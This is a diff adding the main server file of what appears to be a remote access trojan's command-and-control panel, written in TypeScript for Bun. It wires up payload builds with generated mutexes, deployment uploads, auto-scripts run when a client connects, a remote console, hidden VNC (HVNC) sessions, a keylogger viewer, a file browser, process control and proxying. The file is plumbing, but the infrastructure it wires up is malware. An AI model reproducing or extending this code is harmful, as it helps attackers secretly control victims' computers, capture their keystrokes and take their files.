@@ -1,0 +1,414 @@
+import type { ServerWebSocket } from "bun";
+import { decodeMessage, encodeMessage, type WireMessage, type PluginManifest } from "./protocol";
+import { logger } from "./logger";
+import { fileURLToPath } from "url";
+import path from "path";
+import { upsertClientRow, setOnlineState, listClients, markAllClientsOffline, getBuild, getAllBuilds, deleteExpiredBuilds, deleteBuild, getNotificationScreenshot, clearNotificationScreenshots, deleteClientRow, getClientIp, banIp, isIpBanned, clientExists } from "./db";
+import { handleFrame, handleHello, handlePing, handlePong } from "./wsHandlers";
+import { getMessageByteLength, getMaxPayloadLimit, isAllowedClientMessageType } from "./wsValidation";
+import { ClientInfo, ClientRole } from "./types";
+import { v4 as uuidv4 } from "uuid";
+import { authenticateRequest } from "./auth";
+import { loadConfig, getConfig } from "./config";
+import { flushAuditLogsSync } from "./auditLog";
+import { getUserById } from "./users";
+import { requireAuth, requirePermission } from "./rbac";
+import { metrics } from "./metrics";
+import { ensureDataDir } from "./paths";
+import { handleAuthRoutes } from "./server/routes/auth-routes";
+import { handleAutoScriptsRoutes } from "./server/routes/auto-scripts-routes";
+import { handleBuildRoutes } from "./server/routes/build-routes";
+import { handleAssetsRoutes } from "./server/routes/assets-routes";
+import { handleDeployRoutes } from "./server/routes/deploy-routes";
+import { handleFileDownloadRoutes } from "./server/routes/file-download-routes";
+import { handleClientRoutes } from "./server/routes/client-routes";
+import { handleMiscRoutes } from "./server/routes/misc-routes";
+import { handleNotificationsConfigRoutes } from "./server/routes/notifications-config-routes";
+import { handlePageRoutes } from "./server/routes/page-routes";
+import { handlePluginRoutes } from "./server/routes/plugin-routes";
+import { handleUsersRoutes } from "./server/routes/users-routes";
+import { handleWebSocketClose, handleWebSocketMessage, handleWebSocketOpen } from "./server/routes/websocket-lifecycle-routes";
+import { handleWsUpgradeRoutes } from "./server/routes/ws-upgrade-routes";
+import { isAuthorizedAgentRequest } from "./server/agent-auth";
+import { generateBuildMutex, sanitizeMutex, sanitizeOutputName } from "./server/build-utils";
+import { detectUploadOs, normalizeClientOs, type DeployOs } from "./server/deploy-utils";
+import { CORS_HEADERS } from "./server/http-security";
+import { mimeType, secureHeaders, securePluginHeaders } from "./server/http-utils";
+import { sanitizePluginId } from "./server/plugin-utils";
+import { dispatchAutoScriptsForConnection } from "./server/auto-script-dispatch";
+import { consumeHttpDownloadPayload, type PendingHttpDownload } from "./server/http-download-consumer";
+import { startBuildProcess as runBuildProcess } from "./server/build-process";
+import { createHttpFetchHandler } from "./server/http-dispatch";
+import { startMaintenanceLoops } from "./server/maintenance-loops";
+import {
+  deliverNotificationWithScreenshot,
+  storeNotificationScreenshot,
+  takePendingNotificationScreenshot,
+  type NotificationRecord,
+  type PendingNotificationScreenshot,
+} from "./server/notification-delivery";
+import {
+  ensurePluginExtracted as ensurePluginExtractedFromRoot,
+  listPluginManifests as listPluginManifestsFromRoot,
+  loadPluginBundle as loadPluginBundleFromRoot,
+  loadPluginStateFromDisk,
+  savePluginStateToDisk,
+  sendPluginBundle,
+} from "./server/plugin-state-bundle";
+import {
+  DISCONNECT_TIMEOUT_MS,
+  HEARTBEAT_INTERVAL_MS,
+  MAX_WS_MESSAGE_BYTES_CLIENT,
+  MAX_WS_MESSAGE_BYTES_VIEWER,
+  PRUNE_BATCH,
+  STALE_MS,
+} from "./server/runtime-constants";
+import { ALLOWED_PLATFORMS } from "./server/validation-constants";
+import { prepareTlsOptions, logServerStartup } from "./server/tls-bootstrap";
+import { createWebSocketRuntime } from "./server/websocket-runtime";
+import {
+  handleConsoleOutput,
+  handleConsoleViewerMessage,
+  handleConsoleViewerOpen,
+  handleHVNCViewerMessage,
+  handleHVNCViewerOpen,
+  handleRemoteDesktopViewerMessage,
+  handleRemoteDesktopViewerOpen,
+  hvncStreamingState,
+  notifyConsoleClosed,
+  notifyRdInputLatency,
+  notifyRemoteDesktopStatus,
+  rdStreamingState,
+  sendDesktopCommand,
+  sendHVNCCommand,
+  stopConsoleOnTarget,
+} from "./server/ws-console-rd-hvnc";
+import {
+  handleFileBrowserMessage as forwardFileBrowserMessage,
+  handleFileBrowserViewerMessage,
+  handleFileBrowserViewerOpen,
+  handleKeyloggerMessage,
+  handleKeyloggerViewerMessage,
+  handleKeyloggerViewerOpen,
+  handleProcessMessage,
+  handleProcessViewerMessage,
+  handleProcessViewerOpen,
+  handleProxyMessage,
+  handleProxyViewerMessage,
+  handleProxyViewerOpen,
+} from "./server/ws-file-process-proxy-keylogger";
+import { createNotificationPluginHandlers } from "./server/ws-notifications-plugin";
+import * as clientManager from "./clientManager";
+import * as sessionManager from "./sessions/sessionManager";
+import type { SocketData } from "./sessions/types";
+import { SERVER_VERSION } from "./version";
+
+
+const config = loadConfig();
+const isAuthorizedAgent = (req: Request, url: URL) =>
+  isAuthorizedAgentRequest(req, url, config.auth.agentToken);
+
+const PORT = config.server.port;
+const HOST = config.server.host;
+const RUNTIME_ROOT = process.env.OVERLORD_ROOT?.trim()
+  ? path.resolve(process.env.OVERLORD_ROOT)
+  : fileURLToPath(new URL("..", import.meta.url));
+const PUBLIC_ROOT = process.env.OVERLORD_PUBLIC_ROOT?.trim()
+  ? path.resolve(process.env.OVERLORD_PUBLIC_ROOT)
+  : path.join(RUNTIME_ROOT, "public");
+const PLUGIN_ROOT = process.env.OVERLORD_PLUGIN_ROOT?.trim()
+  ? path.resolve(process.env.OVERLORD_PLUGIN_ROOT)
+  : path.join(RUNTIME_ROOT, "plugins");
+const PLUGIN_STATE_PATH = path.join(PLUGIN_ROOT, ".plugin-state.json");
+const DATA_DIR = ensureDataDir();
+const DEPLOY_ROOT = path.join(DATA_DIR, "deploy");
+
+const TLS_CERT_PATH = config.tls.certPath;
+const TLS_KEY_PATH = config.tls.keyPath;
+const TLS_CA_PATH = config.tls.caPath; 
+
+const pluginLoadedByClient = new Map<string, Set<string>>();
+const pendingPluginEvents = new Map<string, Array<{ event: string; payload: any }>>();
+const pluginLoadingByClient = new Map<string, Set<string>>();
+let pluginState = { enabled: {} as Record<string, boolean>, lastError: {} as Record<string, string> };
+
+const savePluginState = () => savePluginStateToDisk(PLUGIN_ROOT, PLUGIN_STATE_PATH, pluginState);
+const loadPluginState = async () => {
+  pluginState = await loadPluginStateFromDisk(PLUGIN_STATE_PATH);
+};
+const ensurePluginExtracted = (pluginId: string) =>
+  ensurePluginExtractedFromRoot(PLUGIN_ROOT, pluginId, sanitizePluginId);
+const listPluginManifests = () =>
+  listPluginManifestsFromRoot(PLUGIN_ROOT, pluginState, savePluginState, ensurePluginExtracted);
+const loadPluginBundle = (pluginId: string) =>
+  loadPluginBundleFromRoot(PLUGIN_ROOT, pluginId, ensurePluginExtracted);
+const startBuildProcess = (buildId: string, buildConfig: any) =>
+  runBuildProcess(buildId, buildConfig, {
+    generateBuildMutex,
+    sanitizeOutputName,
+  });
+
+const pendingHttpDownloads = new Map<string, PendingHttpDownload>();
+
+type DownloadIntent = {
+  id: string;
+  userId: string;
+  clientId: string;
+  path: string;
+  expiresAt: number;
+  timeout: ReturnType<typeof setTimeout>;
+};
+
+const downloadIntents = new Map<string, DownloadIntent>();
+
+type DeployUpload = {
+  id: string;
+  path: string;
+  name: string;
+  size: number;
+  os: DeployOs;
+};
+
+const deployUploads = new Map<string, DeployUpload>();
+
+type NotificationRateState = {
+  lastSent: number;
+  windowStart: number;
+  suppressed: number;
+  lastWarned: number;
+};
+
+const notificationHistory: NotificationRecord[] = [];
+const notificationRate = new Map<string, NotificationRateState>();
+const getNotificationConfig = () => getConfig().notifications;
+
+const pendingNotificationScreenshots = new Map<string, PendingNotificationScreenshot>();
+const takePendingNotificationScreenshotForClient = (clientId: string) =>
+  takePendingNotificationScreenshot(pendingNotificationScreenshots, clientId);
+const storeNotificationScreenshotForPending = (
+  pending: PendingNotificationScreenshot,
+  bytes: Uint8Array,
+  format: string,
+  width?: number,
+  height?: number,
+) => storeNotificationScreenshot(notificationHistory, pending, bytes, format, width, height);
+const deliverNotificationWithScreenshotForRecord = (record: NotificationRecord) =>
+  deliverNotificationWithScreenshot(record, getNotificationConfig);
+
+const notificationPluginHandlers = createNotificationPluginHandlers({
+  notificationHistory,
+  notificationRate,
+  pendingNotificationScreenshots,
+  pluginLoadedByClient,
+  pluginLoadingByClient,
+  pendingPluginEvents,
+  pluginState,
+  getNotificationConfig,
+  storeNotificationScreenshot: storeNotificationScreenshotForPending,
+  deliverNotificationWithScreenshot: deliverNotificationWithScreenshotForRecord,
+  savePluginState,
+});
+
+type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "proxy_viewer" | "notifications_viewer";
+
+type PendingScript = {
+  resolve: (result: any) => void;
+  reject: (error: any) => void;
+  timeout: NodeJS.Timeout;
+};
+const pendingScripts = new Map<string, PendingScript>();
+
+async function startServer() {
+  await loadPluginState();
+  const tlsOptions = await prepareTlsOptions({
+    certPath: TLS_CERT_PATH,
+    keyPath: TLS_KEY_PATH,
+    caPath: TLS_CA_PATH,
+  });
+
+  const routeDeps = {
+    notificationsConfig: {
+      getNotificationScreenshot,
+      secureHeaders,
+    },
+    build: {
+      startBuildProcess,
+      sanitizeMutex,
+      allowedPlatforms: ALLOWED_PLATFORMS,
+    },
+    deploy: {
+      DEPLOY_ROOT,
+      deployUploads,
+      detectUploadOs,
+      normalizeClientOs,
+    },
+    fileDownload: {
+      DATA_DIR,
+      secureHeaders,
+      sanitizeOutputName,
+      pendingHttpDownloads,
+      downloadIntents,
+    },
+    plugin: {
+      PLUGIN_ROOT,
+      pluginState,
+      pluginLoadedByClient,
+      pluginLoadingByClient,
+      pendingPluginEvents,
+      sanitizePluginId,
+      ensurePluginExtracted,
+      savePluginState,
+      listPluginManifests,
+      loadPluginBundle,
+      sendPluginBundle,
+      markPluginLoading: notificationPluginHandlers.markPluginLoading,
+      isPluginLoaded: notificationPluginHandlers.isPluginLoaded,
+      isPluginLoading: notificationPluginHandlers.isPluginLoading,
+      enqueuePluginEvent: notificationPluginHandlers.enqueuePluginEvent,
+      secureHeaders,
+      securePluginHeaders,
+      mimeType,
+    },
+    misc: {
+      CORS_HEADERS,
+      SERVER_VERSION,
+      getConsoleSessionCount: sessionManager.getConsoleSessionCount,
+      getRdSessionCount: sessionManager.getRdSessionCount,
+      getFileBrowserSessionCount: sessionManager.getFileBrowserSessionCount,
+      getProcessSessionCount: sessionManager.getProcessSessionCount,
+    },
+    assets: {
+      PUBLIC_ROOT,
+      secureHeaders,
+      mimeType,
+    },
+    page: {
+      PUBLIC_ROOT,
+      secureHeaders,
+      mimeType,
+    },
+    client: {
+      CORS_HEADERS,
+      pendingScripts,
+    },
+    wsUpgrade: {
+      isAuthorizedAgentRequest: isAuthorizedAgent,
+    },
+  };
+
+  const lifecycleDeps = {
+    maxClientPayloadBytes: MAX_WS_MESSAGE_BYTES_CLIENT,
+    maxViewerPayloadBytes: MAX_WS_MESSAGE_BYTES_VIEWER,
+    pendingScripts,
+    rdStreamingState,
+    hvncStreamingState,
+    getNotificationConfig,
+    handleConsoleViewerOpen,
+    handleRemoteDesktopViewerOpen,
+    handleHVNCViewerOpen,
+    handleFileBrowserViewerOpen,
+    handleProcessViewerOpen,
+    handleKeyloggerViewerOpen,
+    handleProxyViewerOpen,
+    handleNotificationViewerOpen: notificationPluginHandlers.handleNotificationViewerOpen,
+    handleConsoleViewerMessage,
+    handleRemoteDesktopViewerMessage,
+    handleHVNCViewerMessage,
+    handleFileBrowserViewerMessage,
+    handleProcessViewerMessage,
+    handleKeyloggerViewerMessage,
+    handleProxyViewerMessage,
+    dispatchAutoScriptsForConnection,
+    takePendingNotificationScreenshot: takePendingNotificationScreenshotForClient,
+    storeNotificationScreenshot: storeNotificationScreenshotForPending,
+    handleNotificationScreenshotResult: notificationPluginHandlers.handleNotificationScreenshotResult,
+    handleConsoleOutput,
+    handleFileBrowserMessage: (clientId: string, payload: any) =>
+      forwardFileBrowserMessage(clientId, payload, {
+        pendingHttpDownloads,
+        consumeHttpDownloadPayload: (downloadPayload: any) =>
+          consumeHttpDownloadPayload(downloadPayload, pendingHttpDownloads),
+      }),
+    handleProxyMessage,
+    handleProcessMessage,
+    handleKeyloggerMessage,
+    notifyRdInputLatency,
+    handleNotificationScreenshotFailure: notificationPluginHandlers.handleNotificationScreenshotFailure,
+    handlePluginEvent: notificationPluginHandlers.handlePluginEvent,
+    handleNotification: notificationPluginHandlers.handleNotification,
+    stopConsoleOnTarget,
+    sendDesktopCommand,
+    sendHVNCCommand,
+    notifyConsoleClosed,
+    clearPendingNotificationScreenshots: notificationPluginHandlers.clearPendingNotificationScreenshots,
+    notifyRemoteDesktopStatus,
+  };
+
+  const server = Bun.serve<SocketData>({
+    port: PORT,
+    hostname: HOST,
+    tls: tlsOptions,
+    idleTimeout: 255,
+    fetch: createHttpFetchHandler({
+      metrics,
+      CORS_HEADERS,
+      handleAuthRoutes,
+      handleNotificationsConfigRoutes,
+      handleAutoScriptsRoutes,
+      handleUsersRoutes,
+      handleBuildRoutes,
+      handleDeployRoutes,
+      handleFileDownloadRoutes,
+      handlePluginRoutes,
+      handleMiscRoutes,
+      handleAssetsRoutes,
+      handlePageRoutes,
+      handleClientRoutes,
+      handleWsUpgradeRoutes,
+      routeDeps,
+    }),
+    websocket: createWebSocketRuntime({
+      maxClientPayloadBytes: MAX_WS_MESSAGE_BYTES_CLIENT,
+      maxViewerPayloadBytes: MAX_WS_MESSAGE_BYTES_VIEWER,
+      lifecycleDeps,
+      handleWebSocketOpen,
+      handleWebSocketMessage,
+      handleWebSocketClose,
+    }),
+  });
+
+  
+  markAllClientsOffline();
+  clearNotificationScreenshots();
+  
+  
+  deleteExpiredBuilds();
+  logger.info(`[db] Cleaned up expired builds`);
+
+  startMaintenanceLoops({
+    getClients: clientManager.getAllClients,
+    setOnlineState,
+    deleteClient: clientManager.deleteClient,
+    staleMs: STALE_MS,
+    pruneBatch: PRUNE_BATCH,
+    heartbeatIntervalMs: HEARTBEAT_INTERVAL_MS,
+    disconnectTimeoutMs: DISCONNECT_TIMEOUT_MS,
+  });
+
+  logServerStartup(server, TLS_CERT_PATH);
+}
+
+startServer();
+
+
+process.on("SIGINT", () => {
+  logger.info("\n[server] Shutting down gracefully...");
+  flushAuditLogsSync();
+  process.exit(0);
+});
+
+process.on("SIGTERM", () => {
+  logger.info("\n[server] Shutting down gracefully...");
+  flushAuditLogsSync();
+  process.exit(0);
+});
